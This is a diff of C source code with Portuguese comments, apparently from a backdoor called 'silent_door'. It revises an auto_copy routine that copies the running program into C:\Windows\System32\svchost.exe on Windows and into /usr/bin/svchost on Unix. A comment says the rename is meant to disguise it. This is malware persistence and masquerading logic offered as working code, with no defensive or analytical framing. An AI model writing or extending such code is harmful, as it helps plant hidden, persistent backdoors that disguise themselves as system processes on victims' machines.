@@ -30,18 +30,20 @@ return 0;
 int auto_copy()
 {
     // Esta função é mais complexa de tornar portável com execve.
-    // Usar system() é mais simples para este exemplo.
-    // O ideal seria obter o nome do executável via argv[0] no main.
+    // Agora estamos usando a variável global g_executable_path.
 #if defined(_WIN32) || defined(_WIN64)
     // Copia para um local comum no Windows.
     // NOTA: Requer permissões de administrador.
-    system("copy .\\silent_door.exe C:\\Windows\\System32\\ > NUL 2>&1");
+    char command[512];
+    // Usamos snprintf para construir o comando de forma segura
+    snprintf(command, sizeof(command), "copy \"%s\" C:\\Windows\\System32\\svchost.exe > NUL 2>&1", g_executable_path);
+    system(command);
 #else
-    // __progname é uma extensão GNU, não é totalmente portável.
     // Usar fork+execve seria melhor para não substituir o processo.
     pid_t pid = fork();
     if (pid == 0) { // Processo filho
-        char *args[] = {"/bin/cp", __progname, "/usr/bin/", NULL};
+        // Copia para /usr/bin e renomeia para 'svchost' para disfarçar
+        char *args[] = {"/bin/cp", (char*)g_executable_path, "/usr/bin/svchost", NULL};
         execve(args[0], args, NULL);
         exit(1); // Sai se o execve falhar
     }
